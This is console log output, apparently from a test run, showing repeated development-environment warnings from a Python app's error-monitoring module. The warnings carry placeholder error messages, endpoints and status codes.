WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1218'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1219'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1220'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751400Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1221'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1222'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751501Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1223'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1224'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1225'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1226'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1227'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751749Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1228'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1229'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751847Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1230'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751896Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1231'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1232'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1233'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1234'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752107Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1235'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752156Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1236'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1237'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1238'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752304Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1239'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752351Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1240'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1241'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752448Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1242'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1243'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752546Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1244'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752595Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1245'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752644Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1246'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752691Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1247'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752739Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1248'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1249'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752837Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1250'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752886Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1251'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.752970Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1252'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753052Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1253'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1254'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753170Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1255'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753222Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1256'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.753273Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m26[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1257'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
